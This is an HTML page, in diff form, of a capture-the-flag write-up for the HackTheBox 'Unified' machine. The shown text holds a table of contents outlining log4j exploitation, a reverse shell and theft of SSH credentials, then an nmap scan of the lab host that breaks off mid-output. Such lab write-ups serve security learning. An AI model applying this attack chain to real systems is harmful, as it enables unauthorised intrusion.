@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Unified Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Unified Writeup" />
+<meta property="og:description" content="Nmap As always, I&rsquo;m gonna run the Nmap scan against this machine IP address. The scan already completed. Here is the result.
+the result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 # Nmap 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shafiqaiman.com/posts/htb/unified/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/unified/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-02-19T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/unified/featured.png"/>
+<meta name="twitter:title" content="HackTheBox - Unified Writeup"/>
+<meta name="twitter:description" content="Nmap As always, I&rsquo;m gonna run the Nmap scan against this machine IP address. The scan already completed. Here is the result.
+the result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 # Nmap 7."/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/unified/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/vaccine/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/timelapse/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Unified Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/unified\/"
+        },"genre": "posts","keywords": "CVE-2021-44228, unifi-6.4.54, log4j, tcpdump, rogue-jndi, mongodb-checking-is-running, mongodb-dump, mongodb-update, generate-sha512-hash, upgrade-shell-using-script","wordcount":  1743 ,
+        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/unified\/","datePublished": "2022-02-19T00:00:00+00:00","dateModified": "2022-02-19T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SHAFIQAIMAN"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Unified Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SHAFIQAIMAN</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="19-02-2022">19-02-2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1743 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">Nmap</a>
+      <ul>
+        <li><a href="#the-result">the result</a></li>
+      </ul>
+    </li>
+    <li><a href="#port-8080">port 8080</a></li>
+    <li><a href="#unifi---6454">unifi - 6.4.54</a></li>
+    <li><a href="#exploit">exploit</a></li>
+    <li><a href="#how-to-test-it-is-vulnerable-to-log4j">how to test it is vulnerable to log4j</a></li>
+    <li><a href="#tcpdump">tcpdump</a></li>
+    <li><a href="#rogue-jndi">Rogue JNDI</a></li>
+    <li><a href="#create-a-reverse-shell-payload">create a reverse shell payload</a></li>
+    <li><a href="#rogue-jndi-arguments">rogue-jndi arguments</a></li>
+    <li><a href="#upgrade-shell-using-script">upgrade shell using script</a></li>
+    <li><a href="#mongodb">mongoDB</a></li>
+    <li><a href="#checking-mongodb-is-running">checking mongoDB is running</a></li>
+    <li><a href="#dump-userpassword-from-mongodb">dump user/password from mongoDB</a></li>
+    <li><a href="#change-administrator-x_shadow">change administrator x_shadow</a></li>
+    <li><a href="#generate-sha-512-hash">generate sha-512 hash</a></li>
+    <li><a href="#login-page">login page</a></li>
+    <li><a href="#steal-ssh-creds">steal SSH creds</a></li>
+    <li><a href="#ssh-as-root">ssh as root</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="nmap">Nmap</h2>
+<p>As always, I&rsquo;m gonna run the Nmap scan against this machine IP address. The scan already completed. Here is the result.</p>
+<h3 id="the-result">the result</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">18</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">unified</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">96</span><span class="p">.</span><span class="mi">149</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">96</span><span class="p">.</span><span class="mi">149</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">22</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">996</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="p">(</span><span class="k">reset</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">         </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">             </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">2</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="mi">48</span><span class="p">:</span><span class="n">ad</span><span class="p">:</span><span class="n">d5</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">1</span><span class="n">e</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="n">bf</span><span class="p">:</span><span class="n">de</span><span class="p">:</span><span class="n">ae</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">b7</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">6</span><span class="k">c</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">7</span><span class="k">c</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">1</span><span class="k">c</span><span class="p">:</span><span class="mi">1</span><span class="n">f</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">18</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="n">fb</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">6789</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ibm</span><span class="o">-</span><span class="n">db2</span><span class="o">-</span><span class="k">admin</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="o">-</span><span class="n">proxy</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">FourOhFourRequest</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">404</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">431</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">57</span><span class="w"> </span><span class="n">GMT</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">doctype</span><span class="w"> </span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">404</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Found</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span><span class="n">body</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">22</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">16</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">14</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">12</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">black</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="p">.</span><span class="n">line</span><span class="w"> </span><span class="err">{</span><span class="n">height</span><span class="p">:</span><span class="mi">1</span><span class="n">px</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="n">border</span><span class="p">:</span><span class="k">none</span><span class="p">;</span><span class="err">}</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">404</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Found</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">GetRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HTTPOptions</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">302</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Location</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">manage</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">56</span><span class="w"> </span><span class="n">GMT</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">RTSPRequest</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">435</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">56</span><span class="w"> </span><span class="n">GMT</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">doctype</span><span class="w"> </span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
